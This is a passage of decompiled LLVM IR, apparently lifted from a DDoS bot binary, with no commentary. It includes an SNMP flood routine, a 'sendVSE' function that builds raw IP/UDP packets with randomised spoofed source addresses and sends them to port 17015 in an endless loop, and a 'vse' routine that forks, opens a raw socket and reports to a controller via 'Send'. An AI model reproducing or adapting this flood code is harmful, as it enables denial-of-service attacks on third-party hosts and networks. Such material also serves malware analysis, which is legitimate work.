  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  store i32 268450368, i32* @lr, align 4
  %v3_10003a3c = call i32 @__GI_fopen(i32 ptrtoint ([9 x i8]* @global_var_1002a870.126 to i32), i32 ptrtoint ([2 x i8]* @global_var_1002a6e0.110 to i32))
  %v2_10003a60 = add i32 %v0_100039c8, -1
  br label %dec_label_pc_10003bd8.outer

dec_label_pc_10003a4c:                            ; preds = %dec_label_pc_10003bd8
  store i32 %v0_100039c8, i32* @r3, align 4
  %v0_10003a50 = call i32 @__GI_strlen()
  %v1_10003a64 = add i32 %v0_10003a50, %v2_10003a60
  store i32 %v1_10003a64, i32* %r9.global-to-local, align 4
  %v1_10003a68 = inttoptr i32 %v1_10003a64 to i8*
  %v2_10003a68 = load i8, i8* %v1_10003a68, align 1
  %v3_10003a70 = icmp eq i8 %v2_10003a68, 10
  br i1 %v3_10003a70, label %dec_label_pc_10003aa4, label %dec_label_pc_10003a78

dec_label_pc_10003a78:                            ; preds = %dec_label_pc_10003a4c
  store i32 %v0_100039c8, i32* @r3, align 4
  %v0_10003a7c = call i32 @__GI_strlen()
  %v1_10003a90 = add i32 %v0_10003a7c, %v2_10003a60
  store i32 %v1_10003a90, i32* %r9.global-to-local, align 4
  %v1_10003a94 = inttoptr i32 %v1_10003a90 to i8*
  %v2_10003a94 = load i8, i8* %v1_10003a94, align 1
  %v3_10003a9c = icmp eq i8 %v2_10003a94, 13
  br i1 %v3_10003a9c, label %dec_label_pc_10003aa4, label %dec_label_pc_10003bd8

dec_label_pc_10003aa4:                            ; preds = %dec_label_pc_10003a78, %dec_label_pc_10003a4c
  store i32 %v0_100039c8, i32* @r3, align 4
  %v0_10003aa8 = call i32 @__GI_strlen()
  %v1_10003abc = add i32 %v0_10003aa8, %v2_10003a60
  %v3_10003ac4 = inttoptr i32 %v1_10003abc to i8*
  store i8 0, i8* %v3_10003ac4, align 1
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10003acc = load i32, i32* @global_var_10045194.105, align 4
  %v3_10003ad0 = icmp eq i32 %v3_10003acc, 0
  store i32 540, i32* @r3, align 4
  br i1 %v3_10003ad0, label %dec_label_pc_10003ad8, label %dec_label_pc_10003b5c

dec_label_pc_10003ad8:                            ; preds = %dec_label_pc_10003aa4
  store i32 268450528, i32* @lr, align 4
  %v0_10003adc = call i32 @malloc()
  store i32 %v0_10003adc, i32* @global_var_10045194.105, align 4
  store i32 %v0_10003adc, i32* %r9.global-to-local, align 4
  %v2_10003afc = inttoptr i32 %v0_10003adc to i32*
  store i32 0, i32* %v2_10003afc, align 4
  %v1_10003b04 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003b04 = add i32 %v1_10003b04, 4
  %v3_10003b04 = inttoptr i32 %v2_10003b04 to i32*
  store i32 0, i32* %v3_10003b04, align 4
  %v1_10003b0c = load i32, i32* %r9.global-to-local, align 4
  %v2_10003b0c = add i32 %v1_10003b0c, 8
  %v3_10003b0c = inttoptr i32 %v2_10003b0c to i32*
  store i32 0, i32* %v3_10003b0c, align 4
  %v1_10003b14 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003b14 = add i32 %v1_10003b14, 12
  %v3_10003b14 = inttoptr i32 %v2_10003b14 to i32*
  store i32 0, i32* %v3_10003b14, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10003b1c = load i32, i32* @global_var_10045194.105, align 4
  store i32 268450600, i32* @lr, align 4
  %v1_10003b24 = call i32 @inet_addr(i32 %v0_100039c8)
  %v2_10003b2c = add i32 %v3_10003b1c, 4
  %v3_10003b2c = inttoptr i32 %v2_10003b2c to i32*
  store i32 %v1_10003b24, i32* %v3_10003b2c, align 4
  %v3_10003b34 = load i32, i32* @global_var_10045194.105, align 4
  %v2_10003b40 = add i32 %v3_10003b34, 532
  %v3_10003b40 = inttoptr i32 %v2_10003b40 to i32*
  store i32 %v3_10003b34, i32* %v3_10003b40, align 4
  %v3_10003b48 = load i32, i32* @global_var_10045194.105, align 4
  store i32 %v3_10003b48, i32* %r11.global-to-local, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v2_10003b54 = add i32 %v3_10003b48, 536
  %v3_10003b54 = inttoptr i32 %v2_10003b54 to i32*
  store i32 %v3_10003b48, i32* %v3_10003b54, align 4
  br label %dec_label_pc_10003bcc

dec_label_pc_10003b5c:                            ; preds = %dec_label_pc_10003aa4
  store i32 268450660, i32* @lr, align 4
  %v0_10003b60 = call i32 @malloc()
  store i32 540, i32* %r9.global-to-local, align 4
  store i32 %v0_10003b60, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 540, i32* @r5, align 4
  store i32 268450692, i32* @lr, align 4
  %v0_10003b80 = call i32 @__GI_memset()
  store i32 268450700, i32* @lr, align 4
  %v1_10003b88 = call i32 @inet_addr(i32 %v0_100039c8)
  %v2_10003b94 = add i32 %v0_10003b60, 4
  %v3_10003b94 = inttoptr i32 %v2_10003b94 to i32*
  store i32 %v1_10003b88, i32* %v3_10003b94, align 4
  %v3_10003b9c = load i32, i32* @global_var_10045194.105, align 4
  %v2_10003ba4 = add i32 %v0_10003b60, 536
  %v3_10003ba4 = inttoptr i32 %v2_10003ba4 to i32*
  store i32 %v3_10003b9c, i32* %v3_10003ba4, align 4
  %v3_10003bac = load i32, i32* @global_var_10045194.105, align 4
  store i32 %v3_10003bac, i32* %r9.global-to-local, align 4
  %v1_10003bb0 = add i32 %v3_10003bac, 532
  %v2_10003bb0 = inttoptr i32 %v1_10003bb0 to i32*
  %v3_10003bb0 = load i32, i32* %v2_10003bb0, align 4
  %v2_10003bb8 = add i32 %v0_10003b60, 532
  %v3_10003bb8 = inttoptr i32 %v2_10003bb8 to i32*
  store i32 %v3_10003bb0, i32* %v3_10003bb8, align 4
  %v3_10003bc0 = load i32, i32* @global_var_10045194.105, align 4
  store i32 %v3_10003bc0, i32* %r9.global-to-local, align 4
  %v2_10003bc8 = add i32 %v3_10003bc0, 532
  %v3_10003bc8 = inttoptr i32 %v2_10003bc8 to i32*
  store i32 %v0_10003b60, i32* %v3_10003bc8, align 4
  br label %dec_label_pc_10003bcc

dec_label_pc_10003bcc:                            ; preds = %dec_label_pc_10003ad8, %dec_label_pc_10003b5c
  store i32 %stack_var_-1096.0.ph, i32* %r9.global-to-local, align 4
  %v1_10003bd0 = add i32 %stack_var_-1096.0.ph, 1
  br label %dec_label_pc_10003bd8.outer

dec_label_pc_10003bd8.outer:                      ; preds = %dec_label_pc_10003bcc, %dec_label_pc_100038f8
  %stack_var_-1096.0.ph = phi i32 [ %v1_10003bd0, %dec_label_pc_10003bcc ], [ 0, %dec_label_pc_100038f8 ]
  br label %dec_label_pc_10003bd8

dec_label_pc_10003bd8:                            ; preds = %dec_label_pc_10003bd8.outer, %dec_label_pc_10003a78
  store i32 268450792, i32* @lr, align 4
  %v3_10003be4 = call i32 @fgets(i32 %v0_100039c8, i32 128, i32 %v3_10003a3c)
  %v3_10003bec = icmp eq i32 %v3_10003be4, 0
  br i1 %v3_10003bec, label %dec_label_pc_10003bf4, label %dec_label_pc_10003a4c

dec_label_pc_10003bf4:                            ; preds = %dec_label_pc_10003bd8
  %v3_10003bf8 = load i32, i32* @global_var_10045194.105, align 4
  store i32 %v3_10003bf8, i32* %r9.global-to-local, align 4
  %v1_10003bfc = add i32 %v3_10003bf8, 532
  %v2_10003bfc = inttoptr i32 %v1_10003bfc to i32*
  %v3_10003bfc = load i32, i32* %v2_10003bfc, align 4
  %v1_10003c10 = add i32 %arg4, 4
  store i32 %v1_10003c10, i32* %r9.global-to-local, align 4
  %v1_10003c14 = inttoptr i32 %v1_10003c10 to i32*
  %v2_10003c14 = load i32, i32* %v1_10003c14, align 4
  store i32 268450848, i32* @lr, align 4
  %v1_10003c1c = call i32 @inet_addr(i32 %v2_10003c14)
  %v1_10003c2c = mul i32 %v1_100039e4, 28
  %v1_10003c34 = add i32 %v1_10003c2c, 30
  %v1_10003c38 = and i32 %v1_10003c34, -16
  %v2_10003c40 = load i32, i32* %stack_var_-1136, align 4
  %v1_10003c48 = load i32, i32* @r1, align 4
  %v3_10003c48 = sub i32 %v1_10003c48, %v1_10003c38
  %v4_10003c48 = inttoptr i32 %v3_10003c48 to i32*
  store i32 %v2_10003c40, i32* %v4_10003c48, align 4
  %v1_10003c58 = add i32 %v3_10003c48, 23
  %v1_10003c5c = and i32 %v1_10003c58, -16
  store i32 %v1_100039e4, i32* %r9.global-to-local, align 4
  %v2_10003d0c4 = icmp sgt i32 %v1_100039e4, 0
  br i1 %v2_10003d0c4, label %dec_label_pc_10003c7c, label %dec_label_pc_10003d14

dec_label_pc_10003c7c:                            ; preds = %dec_label_pc_10003bf4, %dec_label_pc_10003c7c
  %storemerge27 = phi i32 [ %v1_10003cfc, %dec_label_pc_10003c7c ], [ 0, %dec_label_pc_10003bf4 ]
  %v1_10003c84 = mul i32 %storemerge27, 28
  %v2_10003c88 = add i32 %v1_10003c84, %v1_10003c5c
  %v2_10003c90 = inttoptr i32 %v2_10003c88 to i32*
  store i32 %storemerge27, i32* %v2_10003c90, align 4
  store i32 %v2_10003c88, i32* %r9.global-to-local, align 4
  store i32 %v1_10003c1c, i32* %r11.global-to-local, align 4
  %v2_10003cb4 = add i32 %v2_10003c88, 8
  %v3_10003cb4 = inttoptr i32 %v2_10003cb4 to i32*
  store i32 2, i32* %v3_10003cb4, align 4
  %v0_10003cb8 = load i32, i32* %r11.global-to-local, align 4
  %v1_10003cb8 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003cb8 = add i32 %v1_10003cb8, 12
  %v3_10003cb8 = inttoptr i32 %v2_10003cb8 to i32*
  store i32 %v0_10003cb8, i32* %v3_10003cb8, align 4
  %v0_10003cbc = load i32, i32* %r10.global-to-local, align 4
  %v1_10003cbc = load i32, i32* %r9.global-to-local, align 4
  %v2_10003cbc = add i32 %v1_10003cbc, 16
  %v3_10003cbc = inttoptr i32 %v2_10003cbc to i32*
  store i32 %v0_10003cbc, i32* %v3_10003cbc, align 4
  %v1_10003cc0 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003cc0 = add i32 %v1_10003cc0, 20
  %v3_10003cc0 = inttoptr i32 %v2_10003cc0 to i32*
  store i32 %tmp, i32* %v3_10003cc0, align 4
  %v1_10003cd4 = add i32 %v2_10003c88, 4
  %v2_10003cdc = inttoptr i32 %v1_10003cd4 to i32*
  store i32 %v3_10003bfc, i32* %v2_10003cdc, align 4
  store i32 %v1_10003c5c, i32* %r9.global-to-local, align 4
  %v3_10003cf4 = call i32 @snmpflood(i32 %v2_10003c88, i32 %tmp, i32 %v1_10003c5c)
  %v1_10003cfc = add nuw nsw i32 %storemerge27, 1
  store i32 %v1_100039e4, i32* %r9.global-to-local, align 4
  %v2_10003d0c = icmp slt i32 %v1_10003cfc, %v1_100039e4
  br i1 %v2_10003d0c, label %dec_label_pc_10003c7c, label %dec_label_pc_10003d14

dec_label_pc_10003d14:                            ; preds = %dec_label_pc_10003c7c, %dec_label_pc_10003bf4
  store i32 %v1_10003c10, i32* %r9.global-to-local, align 4
  %v2_10003d1c = load i32, i32* %v1_10003c14, align 4
  %v1_10003d24 = add i32 %arg4, 8
  store i32 %v1_10003d24, i32* %r9.global-to-local, align 4
  %v1_10003d28 = inttoptr i32 %v1_10003d24 to i32*
  %v2_10003d28 = load i32, i32* %v1_10003d28, align 4
  store i32 %v2_10003d28, i32* %r11.global-to-local, align 4
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v7_10003d48 = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_1002a87c.127 to i32), i32 %arg2, i32 %v2_10003d1c)
  %v1_10003e30 = add i32 %arg4, 24
  %v1_10003e34 = inttoptr i32 %v1_10003e30 to i32*
  br label %dec_label_pc_10003e2c

dec_label_pc_10003d58:                            ; preds = %dec_label_pc_10003e2c
  store i32 1000, i32* %r9.global-to-local, align 4
  store i32 268451184, i32* @lr, align 4
  %v1_10003d6c = call i32 @usleep(i32 50000)
  %v3_10003d74 = load i32, i32* @global_var_1004518c.119, align 4
  %v2_10003d7c = mul i32 %v3_10003d74, 20
  %v3_10003d84 = icmp ugt i32 %v2_10003d7c, %v1_10003a00
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10003d90 = load i32, i32* @global_var_10045174.120, align 4
  br i1 %v3_10003d84, label %dec_label_pc_10003d8c, label %dec_label_pc_10003dcc

dec_label_pc_10003d8c:                            ; preds = %dec_label_pc_10003d58
  %v2_10003d94 = icmp sgt i32 %v3_10003d90, 0
  store i32 268697600, i32* %r9.global-to-local, align 4
  br i1 %v2_10003d94, label %dec_label_pc_10003db4, label %dec_label_pc_10003d9c

dec_label_pc_10003d9c:                            ; preds = %dec_label_pc_10003d8c
  %v3_10003da0 = load i32, i32* @global_var_100450b4.121, align 4
  %v1_10003da4 = add i32 %v3_10003da0, 100
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_10003da4, i32* @global_var_100450b4.121, align 4
  br label %dec_label_pc_10003e14

dec_label_pc_10003db4:                            ; preds = %dec_label_pc_10003d8c
  %v1_10003dbc = add i32 %v3_10003d90, -1
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_10003dbc, i32* @global_var_10045174.120, align 4
  br label %dec_label_pc_10003e14

dec_label_pc_10003dcc:                            ; preds = %dec_label_pc_10003d58
  %v1_10003dd4 = add i32 %v3_10003d90, 1
  store i32 %v1_10003dd4, i32* @global_var_10045174.120, align 4
  %v3_10003de4 = load i32, i32* @global_var_100450b4.121, align 4
  %tmp38 = icmp ult i32 %v3_10003de4, 26
  store i32 268697600, i32* %r9.global-to-local, align 4
  br i1 %tmp38, label %dec_label_pc_10003e08, label %dec_label_pc_10003df0

dec_label_pc_10003df0:                            ; preds = %dec_label_pc_10003dcc
  %v1_10003df8 = add i32 %v3_10003de4, -25
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_10003df8, i32* @global_var_100450b4.121, align 4
  br label %dec_label_pc_10003e14

dec_label_pc_10003e08:                            ; preds = %dec_label_pc_10003dcc
  store i32 0, i32* @global_var_100450b4.121, align 4
  br label %dec_label_pc_10003e14

dec_label_pc_10003e14:                            ; preds = %dec_label_pc_10003df0, %dec_label_pc_10003db4, %dec_label_pc_10003d9c, %dec_label_pc_10003e08
  store i32 0, i32* @global_var_1004518c.119, align 4
  store i32 %storemerge3, i32* %r9.global-to-local, align 4
  %v1_10003e24 = add i32 %storemerge3, 1
  br label %dec_label_pc_10003e2c

dec_label_pc_10003e2c:                            ; preds = %dec_label_pc_10003d14, %dec_label_pc_10003e14
  %storemerge3 = phi i32 [ 0, %dec_label_pc_10003d14 ], [ %v1_10003e24, %dec_label_pc_10003e14 ]
  store i32 %v1_10003e30, i32* %r9.global-to-local, align 4
  %v2_10003e34 = load i32, i32* %v1_10003e34, align 4
  store i32 268451392, i32* @lr, align 4
  %v1_10003e3c = call i32 @atol(i32 %v2_10003e34)
  %v2_10003e48 = mul i32 %v1_10003e3c, 20
  store i32 %v2_10003e48, i32* %r9.global-to-local, align 4
  %v3_10003e50 = icmp sgt i32 %v2_10003e48, %storemerge3
  br i1 %v3_10003e50, label %dec_label_pc_10003d58, label %dec_label_pc_10003e58

dec_label_pc_10003e58:                            ; preds = %dec_label_pc_10003e2c, %entry, %dec_label_pc_100038c8
  %v0_10003e84 = phi i32 [ %v1_10003860, %entry ], [ %v0_100038d8, %dec_label_pc_100038c8 ], [ %v1_10003e3c, %dec_label_pc_10003e2c ]
  %v2_10003e58 = load i32, i32* %stack_var_-1136, align 4
  store i32 %v5_10003828, i32* %r9.global-to-local, align 4
  store i32 %v2_10003e58, i32* %r11.global-to-local, align 4
  ret i32 %v0_10003e84

; uselistorder directives
  uselistorder i32 %storemerge3, { 2, 0, 1 }
  uselistorder i32 %v3_10003d90, { 1, 0, 2 }
  uselistorder i32 %v1_10003e30, { 1, 0 }
  uselistorder i32 %v1_10003cfc, { 1, 0 }
  uselistorder i32 %v2_10003c88, { 0, 1, 3, 2, 4 }
  uselistorder i32 %storemerge27, { 2, 1, 0 }
  uselistorder i32 %v1_10003c5c, { 2, 1, 0 }
  uselistorder i32 %stack_var_-1096.0.ph, { 1, 0 }
  uselistorder i32 %v3_10003b48, { 1, 0, 2 }
  uselistorder i32 %v3_10003b34, { 1, 0 }
  uselistorder i32 %v1_100039e4, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_100039c8, { 6, 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v2_10003938, { 1, 0, 2 }
  uselistorder i32 %v2_10003928, { 1, 0 }
  uselistorder i32 %v1_100038e4, { 2, 1, 0, 3, 4 }
  uselistorder i32* %v1_100038d0, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v1_100038cc, { 0, 2, 1, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-1136, { 0, 1, 3, 2 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 9, 11, 2, 4, 3, 5, 6, 7, 8, 10, 12, 13, 14, 20, 15, 16, 17, 18, 19, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10003e58, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10003e2c, { 1, 0 }
  uselistorder label %dec_label_pc_10003e14, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10003c7c, { 1, 0 }
  uselistorder label %dec_label_pc_10003bcc, { 1, 0 }
  uselistorder label %dec_label_pc_100038c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000389c, { 1, 0 }
}

define i32 @sendVSE(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4148 = alloca i32, align 4
  %v2_10003eac = ptrtoint i32* %stack_var_-4148 to i32
  %v1_10003eb8 = add i32 %v2_10003eac, 20
  store i32 2, i32* %stack_var_-52, align 4
  store i32 17015, i32* @r3, align 4
  %v1_10003ecc = call i32 @htons(i32 17015)
  store i32 268451552, i32* @lr, align 4
  %v1_10003edc = call i32 @inet_addr(i32 %arg1)
  store i32 268451576, i32* @lr, align 4
  %v3_10003ef4 = call i32 @socket(i32 2, i32 3, i32 17)
  %tmp19 = icmp sgt i32 %v3_10003ef4, -1
  br i1 %tmp19, label %dec_label_pc_10003f14, label %dec_label_pc_10003f0c

dec_label_pc_10003f0c:                            ; preds = %entry
  %v0_10003f10 = call i32 @__GI_exit()
  br label %dec_label_pc_10003f14

dec_label_pc_10003f14:                            ; preds = %entry, %dec_label_pc_10003f0c
  store i32 %v2_10003eac, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 4096, i32* @r5, align 4
  store i32 268451628, i32* @lr, align 4
  %v0_10003f28 = call i32 @__GI_memset()
  store i32 268451636, i32* @lr, align 4
  %v2_10003f30 = call i32 @setup_ip_header(i32* nonnull %stack_var_-4148)
  %v1_10003f38 = call i32 @setup_udp_header(i32 %v1_10003eb8)
  %v2_10003f44 = add i32 %v2_10003eac, 16
  %v3_10003f44 = inttoptr i32 %v2_10003f44 to i32*
  store i32 %v1_10003edc, i32* %v3_10003f44, align 4
  %v1_10003f50 = or i32 %v2_10003eac, 2
  %v2_10003f50 = inttoptr i32 %v1_10003f50 to i16*
  %v3_10003f50 = load i16, i16* %v2_10003f50, align 2
  %v4_10003f50 = zext i16 %v3_10003f50 to i32
  %v2_10003f60 = bitcast i32* %stack_var_-4148 to i16*
  %v3_10003f60 = call i32 @csum(i16* %v2_10003f60, i32 %v4_10003f50)
  %v1_10003f6c = trunc i32 %v3_10003f60 to i16
  %v3_10003f6c = add i32 %v2_10003eac, 10
  %v4_10003f6c = inttoptr i32 %v3_10003f6c to i16*
  store i16 %v1_10003f6c, i16* %v4_10003f6c, align 2
  store i32 1, i32* %stack_var_-36, align 4
  %v2_10003f78 = ptrtoint i32* %stack_var_-36 to i32
  store i32 268451736, i32* @lr, align 4
  %v5_10003f94 = call i32 @__GI_setsockopt(i32 %v3_10003ef4, i32 0, i32 3, i32 %v2_10003f78, i32 4)
  %tmp20 = icmp sgt i32 %v5_10003f94, -1
  br i1 %tmp20, label %dec_label_pc_10003fac, label %dec_label_pc_10003fa4

dec_label_pc_10003fa4:                            ; preds = %dec_label_pc_10003f14
  %v0_10003fa8 = call i32 @__GI_exit()
  br label %dec_label_pc_10003fac

dec_label_pc_10003fac:                            ; preds = %dec_label_pc_10003f14, %dec_label_pc_10003fa4
  store i32 268451764, i32* @lr, align 4
  %v1_10003fb0 = call i32 @__GI_time(i32 0)
  %v1_10003fbc = call i32 @init_rand(i32 %v1_10003fb0)
  %v2_10003fd0 = ptrtoint i32* %stack_var_-52 to i32
  %v2_1000404c = add i32 %v2_10003eac, 12
  %v3_1000404c = inttoptr i32 %v2_1000404c to i32*
  %v3_1000406c = add i32 %v2_10003eac, 4
  %v4_1000406c = inttoptr i32 %v3_1000406c to i16*
  br label %dec_label_pc_10003fc0

dec_label_pc_10003fc0:                            ; preds = %dec_label_pc_10003fc0, %dec_label_pc_10003fac
  %v3_10003fc4 = load i16, i16* %v2_10003f50, align 2
  %v4_10003fc4 = zext i16 %v3_10003fc4 to i32
  store i32 268451828, i32* @lr, align 4
  %v6_10003ff0 = call i32 @sendto(i32 %v3_10003ef4, i32 %v2_10003eac, i32 %v4_10003fc4, i32 0, i32 %v2_10003fd0, i32 16)
  %v0_10003ff4 = call i32 @rand_cmwc()
  %v1_10003ffc = urem i32 %v0_10003ff4, 16777216
  %v1_10004004 = sub i32 %v0_10003ff4, %v1_10003ffc
  %v0_10004008 = call i32 @rand_cmwc()
  %v1_10004014 = and i32 %v0_10004008, 16711680
  %v2_1000401c = or i32 %v1_10004004, %v1_10004014
  %v0_10004020 = call i32 @rand_cmwc()
  %v1_1000402c = and i32 %v0_10004020, 65280
  %v2_10004034 = or i32 %v2_1000401c, %v1_1000402c
  %v0_10004038 = call i32 @rand_cmwc()
  %v1_10004040 = urem i32 %v0_10004038, 256
  %v2_10004044 = or i32 %v2_10004034, %v1_10004040
  store i32 %v2_10004044, i32* %v3_1000404c, align 4
  %v0_10004050 = call i32 @rand_cmwc()
  store i32 %v0_10004050, i32* @r3, align 4
  %v1_1000405c = call i32 @htonl(i32 %v0_10004050)
  %v1_1000406c = trunc i32 %v1_1000405c to i16
  store i16 %v1_1000406c, i16* %v4_1000406c, align 4
  %v3_10004078 = load i16, i16* %v2_10003f50, align 2
  %v4_10004078 = zext i16 %v3_10004078 to i32
  %v3_10004088 = call i32 @csum(i16* %v2_10003f60, i32 %v4_10004078)
  %sext2 = mul i32 %v3_10004088, 65536
  %v1_1000408c = sdiv i32 %sext2, 65536
  %v1_10004094 = trunc i32 %v1_1000408c to i16
  store i16 %v1_10004094, i16* %v4_10003f6c, align 2
  br label %dec_label_pc_10003fc0

; uselistorder directives
  uselistorder i32 %v2_10003eac, { 5, 1, 2, 3, 0, 4, 6, 7 }
  uselistorder i32* %stack_var_-4148, { 1, 0, 2 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder label %dec_label_pc_10003fac, { 1, 0 }
  uselistorder label %dec_label_pc_10003f14, { 1, 0 }
}

define i32 @vse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-2656 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000409c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000409c, i32* %stack_var_-2656, align 4
  %v5_1000409c = ptrtoint i32* %stack_var_-2656 to i32
  %v1_100040cc = call i32 @mfork(i32 %arg2)
  %v3_100040d4 = icmp eq i32 %v1_100040cc, 0
  br i1 %v3_100040d4, label %dec_label_pc_100040dc, label %dec_label_pc_100044c0

dec_label_pc_100040dc:                            ; preds = %entry
  store i32 268452076, i32* @lr, align 4
  %v3_100040e8 = call i32 @socket(i32 2, i32 3, i32 255)
  %tmp36 = icmp sgt i32 %v3_100040e8, -1
  br i1 %tmp36, label %dec_label_pc_10004108, label %dec_label_pc_10004100

dec_label_pc_10004100:                            ; preds = %dec_label_pc_100040dc
  %v0_10004104 = call i32 @__GI_exit()
  br label %dec_label_pc_10004108

dec_label_pc_10004108:                            ; preds = %dec_label_pc_100040dc, %dec_label_pc_10004100
  %v2_1000410c = icmp sgt i32 %arg3, 3
  br i1 %v2_1000410c, label %dec_label_pc_10004134, label %dec_label_pc_10004114

dec_label_pc_10004114:                            ; preds = %dec_label_pc_10004108
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v6_10004128 = call i32 @Send(i32 %arg1, i32 ptrtoint ([89 x i8]* @global_var_1002a8a4.130 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v0_10004130 = call i32 @__GI_exit()
  br label %dec_label_pc_10004134

dec_label_pc_10004134:                            ; preds = %dec_label_pc_10004108, %dec_label_pc_10004114
  %v1_10004138 = add i32 %arg4, 12
  store i32 %v1_10004138, i32* %r9.global-to-local, align 4
  %v1_1000413c = inttoptr i32 %v1_10004138 to i32*
  %v2_1000413c = load i32, i32* %v1_1000413c, align 4
  store i32 %v2_1000413c, i32* @r3, align 4
  %v0_10004144 = call i32 @__GI_strlen()
  %v1_1000414c = mul i32 %v0_10004144, 5
  store i32 %v1_1000414c, i32* %r9.global-to-local, align 4
  %v1_10004150 = add i32 %v1_1000414c, 160
  %v2_1000415c = icmp sgt i32 %v1_10004150, 1023
  br i1 %v2_1000415c, label %dec_label_pc_100044c0, label %dec_label_pc_10004164

dec_label_pc_10004164:                            ; preds = %dec_label_pc_10004134
  store i32 268452204, i32* @lr, align 4
  %v1_10004168 = call i32 @__GI_time(i32 0)
  store i32 ptrtoint (i32* @global_var_10004178.132 to i32), i32* @lr, align 4
  %v1_10004174 = call i32 @srand(i32 %v1_10004168)
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 0, i32* @global_var_10045194.105, align 4
  store i32 128, i32* @r3, align 4
  store i32 268452256, i32* @lr, align 4
  %v0_1000419c = call i32 @malloc()
  store i32 128, i32* %r9.global-to-local, align 4
  store i32 %v0_1000419c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  store i32 268452288, i32* @lr, align 4
  %v0_100041bc = call i32 @__GI_memset()
  %v1_100041cc = add i32 %arg4, 4
  store i32 %v1_100041cc, i32* %r9.global-to-local, align 4
  %v1_100041d0 = inttoptr i32 %v1_100041cc to i32*
  %v2_100041d0 = load i32, i32* %v1_100041d0, align 4
  store i32 268452320, i32* @lr, align 4
  %v3_100041dc = call i32 @host2ip(i32 %arg2, i32 %v2_100041d0, i32 %v1_100041cc)
  %v1_100041ec = add i32 %arg4, 8
  store i32 %v1_100041ec, i32* %r9.global-to-local, align 4
  %v1_100041f0 = inttoptr i32 %v1_100041ec to i32*
  %v2_100041f0 = load i32, i32* %v1_100041f0, align 4
  store i32 268452348, i32* @lr, align 4
  %v1_100041f8 = call i32 @atol(i32 %v2_100041f0)
  store i32 %v1_10004138, i32* %r9.global-to-local, align 4
  %v2_1000420c = load i32, i32* %v1_1000413c, align 4
  store i32 268452376, i32* @lr, align 4
  %v1_10004214 = call i32 @atol(i32 %v2_1000420c)
  %v1_10004224 = add i32 %arg4, 16
  store i32 %v1_10004224, i32* %r9.global-to-local, align 4
  %v1_10004228 = inttoptr i32 %v1_10004224 to i32*
  %v2_10004228 = load i32, i32* %v1_10004228, align 4
  store i32 268452404, i32* @lr, align 4
  %v1_10004230 = call i32 @atol(i32 %v2_10004228)
  %v1_10004240 = add i32 %arg4, 20
  store i32 %v1_10004240, i32* %r9.global-to-local, align 4
  %v1_10004244 = inttoptr i32 %v1_10004240 to i32*
  %v2_10004244 = load i32, i32* %v1_10004244, align 4
  store i32 268452432, i32* @lr, align 4
  %v1_1000424c = call i32 @atol(i32 %v2_10004244)
  store i32 0, i32* @global_var_10045174.120, align 4
  store i32 0, i32* @global_var_1004518c.119, align 4
  store i32 %v1_100041cc, i32* %r9.global-to-local, align 4
  %v2_10004290 = load i32, i32* %v1_100041d0, align 4
  store i32 268452508, i32* @lr, align 4
  %v1_10004298 = call i32 @inet_addr(i32 %v2_10004290)
  %v1_100042a8 = mul i32 %v1_10004214, 28
  %v1_100042b0 = add i32 %v1_100042a8, 30
  %v1_100042b4 = and i32 %v1_100042b0, -16
  %v2_100042bc = load i32, i32* %stack_var_-2656, align 4
  %v1_100042c4 = load i32, i32* @r1, align 4
  %v3_100042c4 = sub i32 %v1_100042c4, %v1_100042b4
  %v4_100042c4 = inttoptr i32 %v3_100042c4 to i32*
  store i32 %v2_100042bc, i32* %v4_100042c4, align 4
  %v1_100042d4 = add i32 %v3_100042c4, 23
  %v1_100042d8 = and i32 %v1_100042d4, -16
  store i32 %v1_10004214, i32* %r9.global-to-local, align 4
  %v2_1000436c4 = icmp sgt i32 %v1_10004214, 0
  br i1 %v2_1000436c4, label %dec_label_pc_100042f8, label %dec_label_pc_10004374

